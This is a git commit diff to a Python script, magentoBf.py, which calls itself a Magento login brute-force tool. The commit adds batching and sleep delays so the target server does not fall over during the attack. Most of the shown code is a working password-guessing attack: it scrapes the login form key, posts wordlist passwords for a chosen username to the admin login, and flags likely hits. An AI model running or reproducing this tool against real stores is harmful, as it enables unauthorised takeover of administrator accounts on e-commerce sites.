4b39667bdecaf15acc1d82f56f49d2f6b6fcd758
arale61 <arale61@protonmail.com>
2023-08-13 23:21:52 +0200

    Add some poor man's contention to avoid denying the web service/server

--- magentoBf.py
+++ magentoBf.py
@@ -29,12 +29,14 @@ desc = '''
 parser = argparse.ArgumentParser(description='Yet another Magento login Bruteforce script.')
 parser.add_argument("-u", help="The username to try to brute force the password. Defaults to admin", default="admin")
 parser.add_argument("-w", help="The password wordlist fullpath to use")
+parser.add_argument("-max_conc_calls", help="Number. Max concurrent calls to try to schedulle. Defaults to 200.", default=200, type=int)
+parser.add_argument("-t", help="Number. Time to wait between max concurrent blocks. Defaults to 2 secs.", default=2, type=int)
 parser.add_argument("url", help="The url where the Magento login is located")
 
 
 async def gen(wordlist):
     with open(wordlist, 'rt') as f:
-        for i in f.readlines():
+        for i in f:
             yield i.strip()
 
 
@@ -48,9 +50,9 @@ async def do_request(url, username, password):
             if form_key != None and len(form_key) == 1:
                 form_key = form_key[0]
                 data_str = f"form_key={form_key}&login%5Busername%5D={username}&login%5Bpassword%5D={password}"
-                async with session.post(url, data=data_str, cookies=response.cookies, headers=hp, allow_redirects=False) as response:
-                    t = await response.text()
-                    c = response.status
+                async with session.post(url, data=data_str, cookies=response.cookies, headers=hp, allow_redirects=False) as response2:
+                    t = await response2.text()
+                    c = response2.status
                     if c == 200:
                         if "messages-message-error" in t:
                             print(f"[X] Bad {username}: {password}                     ", end="\r")
@@ -58,7 +60,7 @@ async def do_request(url, username, password):
                         print(f"[V] To Check: {username}: {password}")
 
 
-async def main(url, username, wordlist): 
+async def main(url, username, wordlist, max_concurrent_calls, ttime): 
     tasks = []
     try:
         print(desc)
@@ -67,11 +69,21 @@ async def main(url, username, wordlist):
     - Magento URL: {url}
     - username: {username}
     - wordlist: {wordlist}
+    - Concurrent requests: {max_concurrent_calls}
+    - Time to wait foreach concurrent block: {ttime} seconds.
         '''
         print(resume)
         print("")
+        j=0
         async for i in gen(wordlist):
+            j+=1
             tasks.append(asyncio.create_task(do_request(url, username, i)))
+            if j >= max_concurrent_calls:
+                await asyncio.wait(tasks)
+                tasks.clear()
+                j = 0
+                await asyncio.sleep(ttime)
+
         await asyncio.wait(tasks)
     except Exception as e:
         print(e)
@@ -84,7 +96,9 @@ if __name__ == "__main__":
         username = args.u
         wordlist = args.w
         url = args.url
+        max_concurrent_calls = args.max_conc_calls
+        t = args.t
         loop = asyncio.get_event_loop()
-        loop.run_until_complete(main(url, username, wordlist))
+        loop.run_until_complete(main(url, username, wordlist, max_concurrent_calls, t))
     except :
         pass
